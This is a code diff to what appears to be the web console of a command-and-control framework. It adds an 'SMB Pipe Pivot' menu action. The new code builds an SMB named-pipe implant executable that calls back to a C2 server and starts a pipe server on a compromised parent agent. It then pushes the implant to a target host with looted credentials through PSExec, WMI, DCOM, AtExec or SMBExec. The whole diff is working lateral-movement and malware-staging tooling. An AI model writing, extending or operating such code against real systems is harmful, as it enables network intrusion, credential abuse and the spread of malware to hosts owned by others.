@@ -2571,6 +2571,84 @@ async function runCtxAction(act) {
       });
       break;
     }
+    case 'smbPivot': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      const agnt = agents.find(x => x.id === aid);
+      const parentIP = agnt?.ip;
+      if (!parentIP) { toast('Cannot determine parent agent IP', 'red'); break; }
+
+      const pivotMethods = [
+        {v:'psexec',  l:'PSExec (ADMIN$ + SCM service)'},
+        {v:'wmi',     l:'WMI (Win32_Process::Create)'},
+        {v:'dcom',    l:'DCOM (MMC20.Application)'},
+        {v:'atexec',  l:'AtExec (Task Scheduler)'},
+        {v:'smbexec', l:'SMBExec (in-memory)'},
+      ];
+      showQuickForm('🔗 SMB Pipe Pivot', [
+        {key:'host',   label:'Target host / IP', def:'', ph:'10.10.10.x'},
+        {key:'_cred',  label:'Loot credentials', type:'cred-pick'},
+        {key:'user',   label:'Username',          def:'', ph:'DOMAIN\\user'},
+        {key:'pass',   label:'Password',          type:'password', ph:''},
+        {key:'method', label:'Staging method',    type:'select', options:pivotMethods},
+      ], async vals => {
+        if (!vals.host) { toast('Host required', 'red'); return; }
+
+        // Generate unique pipe name so each pivot gets its own channel
+        const pipeSuffix = Math.random().toString(16).slice(2, 8);
+        const pipeName   = `svc_${pipeSuffix}`;
+        const pipeUNC    = `\\\\${parentIP}\\pipe\\${pipeName}`;
+        const outName    = `${pipeName}.exe`;
+        const c2host     = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(e) { return '127.0.0.1'; } })();
+        const serverURL  = `http://${c2host}:8080`;
+
+        openConsoleFor(aid);
+        addConsoleOutputForAgent(aid, `[smb-pivot] Building ${outName} → pipe:${pipeUNC}`, '', null);
+        addConsoleOutputForAgent(aid, `[smb-pivot] Starting pipe server on parent simultaneously…`, '', null);
+
+        // Step 1: build SMB exe + start pipe server on parent (in parallel)
+        const [buildR, pipeR] = await Promise.all([
+          api('POST', '/api/build', {
+            format:'exe', transport:'smb',
+            smb_pipe: pipeUNC, server_url: serverURL,
+            sleep_sec:5, jitter_pct:10, output_name: outName,
+          }),
+          api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:pipeName}),
+        ]);
+
+        if (!pipeR?.ok) {
+          addConsoleOutputForAgent(aid, '', `[smb-pivot] ✗ PIPE_START failed: ${pipeR?.error||'error'}`, null);
+          return;
+        }
+        addConsoleOutputForAgent(aid, `[smb-pivot] ✓ PIPE_START dispatched`, '', null);
+        if (pipeR.data?.task_id) pollResult(pipeR.data.task_id, aid);
+
+        if (!buildR?.ok) {
+          addConsoleOutputForAgent(aid, '', `[smb-pivot] ✗ Build failed: ${buildR?.error||'build error'}`, null);
+          return;
+        }
+        addConsoleOutputForAgent(aid, `[smb-pivot] ✓ Payload built: ${outName}`, '', null);
+
+        // Step 2: wait for pipe server to start (agent check-in interval + latency)
+        addConsoleOutputForAgent(aid, `[smb-pivot] Waiting 6s for pipe server to come up…`, '', null);
+        await new Promise(r => setTimeout(r, 6000));
+
+        // Step 3: register lateral watcher so the new child auto-gets parent_id
+        _lateralWatchers[vals.host] = {
+          parentID: aid,
+          knownIds: new Set(agents.map(a => a.id)),
+          expiry: Date.now() + 300000,
+        };
+
+        // Step 4: deploy payload to target via chosen staging method
+        const method  = vals.method || 'psexec';
+        const cmdLine = `jump ${method} ${vals.host} ${outName} ${vals.user} ${vals.pass}`;
+        addConsoleOutputForAgent(aid, `[smb-pivot] Deploying → ${vals.host} via ${method}…`, '', null);
+        dispatchConsoleCmd(aid, cmdLine);
+        toast(`SMB pivot launched → ${vals.host} | pipe:${pipeName}`, 'green');
+      });
+      break;
+    }
     case 'quickPrivesc': {
       const aid = act.id || activeAgent?.id;
       if (!aid) break;
@@ -2863,6 +2941,8 @@ function agentContextMenu(e, agentId) {
       {label:'DCOM…',              action:{fn:'lateralMove', id, method:'dcom'}},
       {label:'AtExec…',            action:{fn:'lateralMove', id, method:'atexec'}},
       {label:'SMBExec…',           action:{fn:'lateralMove', id, method:'smbexec'}},
+      null,
+      {label:'🔗 SMB Pipe Pivot…', action:{fn:'smbPivot', id}},
       null,
       {label:'WinRM exec…',        action:{fn:'lateralMove', id, method:'winrm-exec'}},
       {label:'WinRM deploy…',      action:{fn:'lateralMove', id, method:'winrm-deploy'}},
